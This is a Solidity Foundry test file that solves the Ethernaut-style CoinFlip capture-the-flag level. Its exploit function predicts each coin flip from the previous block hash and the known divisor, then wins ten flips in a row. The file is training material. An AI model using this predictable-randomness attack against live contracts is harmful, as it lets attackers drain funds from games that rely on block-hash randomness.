// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "../src/levels/CoinFlip.sol";
import "../src/levels/CoinFlipFactory.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestCoinFlip is BaseTest {
    CoinFlip private level;
    using SafeMath for uint256;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new CoinFlipFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = CoinFlip(levelAddress);

    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        while (level.consecutiveWins() < 10) {
            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
            uint256 coinFlip = blockValue.div(factor);
            level.flip(coinFlip == 1 ? true : false);

            utilities.mineBlocks(1);
        }

        assertEq(level.consecutiveWins(), 10);

        vm.stopPrank();
    }
}
